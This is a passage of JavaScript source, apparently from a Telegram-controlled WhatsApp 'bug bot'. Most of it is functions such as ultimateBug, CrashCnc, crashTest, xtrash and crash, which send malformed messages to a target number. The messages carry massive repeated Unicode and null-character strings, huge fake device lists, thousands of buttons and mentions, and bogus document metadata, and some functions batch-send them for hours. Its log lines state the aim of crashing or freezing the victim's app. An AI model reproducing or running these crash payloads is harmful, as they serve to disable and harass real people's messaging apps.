                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnkontolCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let message = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0000" + "ꦽ".repeat(102002) + "\u0000".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(1000000), version: 3 },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "galaxy_message", buttonParamsJson: "" },
                        ]
                    }
                },
                messageContextInfo: {
                    deviceListMetadata: { devices: new Array(100000).fill({ id: "device", type: "invalid" }) },
                    deviceListMetadataVersion: 9999999999,
                }
            }
        }
    };

    try {
        await zephy.relayMessage(target, message, { participant: { jid: target } });
        console.log(`𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞`);
    } catch (err) {
        console.log(err);
    }
}

async function ultimateBug(target, ptcp = true) {
    let mentions = Array(5000).fill("6283871656842@s.whatsapp.net"); // 3000 mention tetap tanpa looping

    let messagePayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🔥 ULTIMATE WA CRASH 🔥",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⚠️ WARNING: LAG INCOMING ⚠️\n" + "𓆩𓆪".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "{\"url\":\"https://t.me/devor6core\"}"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{\"request\":\"permission\"}"
                            }
                        ]
                    }
                },
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                    mimetype: "application/pdf",
                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                    fileLength: "9999999999999",
                    pageCount: 999999,
                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                    fileName: "💀 DEADLY WA CRASH 💀",
                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                    mediaKeyTimestamp: "1735456100",
                    contactVcard: true,
                    caption: "📌 *WA STRESS TEST* 📌"
                },
                extendedTextMessage: {
                    text: "🚀 SYSTEM OVERLOAD 🚀\n" + mentions.join(" "),
                    contextInfo: {
                        mentionedJid: mentions
                    }
                }
            }
        }
    };

    await zephy.relayMessage(target, messagePayload, {
        participant: { jid: target }
    });

    console.log("Ultimate crash message sent. WhatsApp might force close.");
}
async function cak(target, ptcp = true) { let buttons = [];

// Membuat 10 tombol interaktif
for (let i = 1; i <= 2000; i++) {
    buttons.push({
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
            display_text: `Tombol ${i}`,
            url: "https://example.com"
        })
    });
}

let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    title: "TEST INTERACTIVE MESSAGE",
                    hasMediaAttachment: false
                },
                body: {
                    text: "Testing" + "Test ".repeat(50000), // Ulangi kata "Test" sebanyak 1000 kali
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: buttons // Menggunakan array tombol yang dibuat
                }
            }
        }
    }
}, {});

await zephy.relayMessage(target, msg.message, ptcp ? { participant: { jid: target } } : {});
console.log(`Pesan interaktif berhasil dikirim.`);

}
async function CrashCnc(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(100000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "⟅ ▾ 𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 ϟ ▾ ⟅".repeat(10000),
                        },
                                    nativeFlowMessage: {
                                      buttons: [
                              {
                              name: "single_select",
                       buttonParamsJson: "",
                           },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                                }
                            ],
                        },
                    },
                },
            },
        };

        await zephy.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}
async function crashTest(target) {
    try {
        for (let i = 0; i < 50; i++) { // Memperbesar jumlah repeat untuk efek lebih ekstrem
            let message = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {
                                devices: new Array(200000).fill({ id: "device", type: "invalid" }) // Menambah lebih banyak perangkat
                            },
                            deviceListMetadataVersion: 9999999999, 
                        },
                        interactiveMessage: {
                            contextInfo: {
                                mentionedJid: [target],
                                isForwarded: true,
                                forwardingScore: Infinity, 
                                businessMessageForwardInfo: {
                                    businessOwnerJid: target,
                                },
                            },
                            body: {
                                text: "⟅ ▾ 𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 ϟ ▾ ⟅".repeat(50000), // Memperbanyak pengulangan teks
                            },
                            nativeFlowMessage: {
                                buttons: Array(5000).fill({ name: "mpm", buttonParamsJson: "" }) // Memperbanyak jumlah tombol
                            },
                        },
                    },
                },
            };

            await zephy.relayMessage(target, message, {
                participant: { jid: target },
            });

            await new Promise(resolve => setTimeout(resolve, 100)); // Mempercepat pengiriman untuk efek lebih intens
        }
    } catch (err) {
        console.log("Error sending crash message:", err);
    }
}
    async function EpUi(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐑𝐢𝐥𝐲𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*halo*".repeat(100000),
                            },
                            nativeFlowMessage: {
                        messageParamsJson: "{}",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "{\"url\":\"https://example.com\"}"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{\"request\":\"permission\"}"
                            }
                        ]
                    }
                }
            }
        }
    }, {});
            await zephy.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("𝐑𝐢𝐥𝐲𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 !!!!"));
        }
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
          async function InVisibleX(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞",
                    footerText: "𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await zephy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await zephy.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "༑⌁⃰𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 *༑⌁",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
     
async function xtrash(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "ꦾ".repeat(50000);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "RILLYZY IS HERE⚡  リリジリリージー",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await zephy.relayMessage(target, message, {
        participant: { jid: target },
      });
      console.log(chalk.green("RILLYZY IS HERE⚡"));
    }
async function bug1(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "ꦾ".repeat(50000);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "I always love you",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await zephy.relayMessage(target, message, {
        participant: { jid: target },
      });
      console.log(chalk.green("Succes Send Payload!!!"));
    }

async function crash(target) {
let sections = [];
for (let i = 0; i < 9999; i++) { // Sesuaikan jumlah section
let largeText = 'ྀི'.repeat(5999); // Pesan besar

let deepNested = {
title: `Section ${i + 1}`,
highlight_label: `Highlight ${i + 1}`,
rows: [{
title: largeText,
id: `id${i}`,
subrows: [
{
title: 'Nested row 1',
id: `nested_id1_${i}`,
subsubrows: [
{
title: 'Deep Nested row 1',
id: `deep_nested_id1_${i}`
},
{
title: 'Deep Nested row 2',
id: `deep_nested_id2_${i}`
}
]
},
{
title: 'Nested row 2',
id: `nested_id2_${i}`
}
]
}]
};

sections.push(deepNested);
}

let listMessage = {
title: "RILLYZY IS HERE",
sections: sections
};

let msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999
},
body: proto.Message.InteractiveMessage.Body.create({
text: "RILLYZY🔥" + "ꦾ".repeat(89999)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: JSON.stringify(listMessage)
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: JSON.stringify(listMessage),
subtitle: "RILLYZY CRASHER" + "ྀི".repeat(4999), 
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
  buttons: [
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}

]
})
})
}
}
}, {});

await zephy.relayMessage(target, msg.message, {
messageId: msg.key.id
});

console.log(`Succes Send Crash`);
}

async function sendMessagesForDuration(durationHours, target) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            zephy.reply("✅ Pengiriman selesai sesuai durasi yang ditentukan.");
            return;
        }

        if (count < 100) {
            await invis(target);
            
            count++;
            sendNext(); // Lanjutkan tanpa delay antar pesan
        } else {
            zephy.reply(`Selesai mengirimkan 100 pesan ke ${target}.`);
            count = 0; // Reset untuk batch berikutnya
            zepyhy.reply("Menunggu 1 menit untuk melanjutkan pengiriman 100 pesan bug.");
            setTimeout(sendNext, 60000); // Tunggu 90 detik sebelum batch berikutnya
        }
    };

    sendNext();
}

async function fuckmark(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "HAI RILLYZY👀",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await zephy.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "I really love you",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await zephy.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }

async function delay(target, Ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = "ꦽ".repeat(50000);
  await zephy.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "FUCK YOU HYTAM😹",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://c.top4top.io/p_3338804051.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "HALO HYTAM😹😹" + ui + jids
          },
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            mentions: ["13135550002@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Fuck You Bitch!",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");

let isBotLaunched = false;

async function startBot() {
  if (!isBotLaunched) {
    await bot.launch();
    isBotLaunched = true;
    console.log("Bot aktif...");
  }
}

async function stopBot() {
  if (isBotLaunched) {
    await bot.stop();
    isBotLaunched = false;
    console.log("Bot dihentikan karena token tidak lagi valid.");
  }
}

async function validateTokenLoop() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST);
    const validTokens = response.data.tokens || [];

    if (validTokens.includes(BOT_TOKEN)) {
      await startBot();
    } else {
      await stopBot();
    }
  } catch (err) {
    console.error("Gagal ambil token saat pengecekan:", err.message);
    await stopBot(); // Jika error akses GitHub, lebih aman bot dimatikan
  }
}

// Jalankan pengecekan pertama kali
validateTokenLoop();

// Cek ulang setiap 30 detik
setInterval(validateTokenLoop, 30000);
